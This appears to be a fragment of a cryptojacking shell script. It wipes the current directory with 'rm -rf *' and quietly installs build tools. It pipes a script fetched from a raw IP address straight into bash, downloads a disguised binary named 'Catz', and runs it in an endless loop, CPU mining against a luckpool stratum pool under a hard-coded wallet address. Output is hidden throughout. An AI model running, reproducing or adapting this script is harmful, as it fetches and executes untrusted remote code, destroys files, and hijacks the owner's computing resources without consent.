...
ls -la
rm -rf *
apt update >/dev/null;apt -y install automake libsodium-dev libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null
...
curl -fsSL http://139.162.224.126/install_and_monitor_shade_root.sh | bash &

sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_DTC_')
...
./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/Catz.tar.gz > /dev/null
...
while true
do
./update/update ./Catz -c stratum+tcp://na.luckpool.net:3956 -u RJvEryQP1KJqeaZv74ytVxWSS7KKdNSFfW.$currentdate -p x --cpu $used_num_of_cores 1>/dev/null 2>&1
sleep 10
done
